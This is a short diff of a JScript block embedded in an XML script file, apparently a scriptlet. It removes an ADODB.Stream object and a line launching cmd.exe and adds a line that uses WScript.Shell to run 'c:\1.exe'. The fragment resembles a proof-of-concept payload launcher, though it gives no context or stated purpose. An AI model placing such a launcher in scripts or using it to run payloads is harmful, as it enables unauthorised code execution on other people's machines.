@@ -12,11 +12,10 @@
 
 <script language="JScript">
 <![CDATA[
-  var objArgs=WScript.Arguments; 
-  var sGet=new ActiveXObject("ADODB.Stream"); 
 
-  
-  var r = new ActiveXObject("WScript.Shell").Run("cmd.exe");
+	var r = new ActiveXObject("WScript.Shell").Run("c:\\1.exe");
+	
+	
 ]]>
 </script>
 
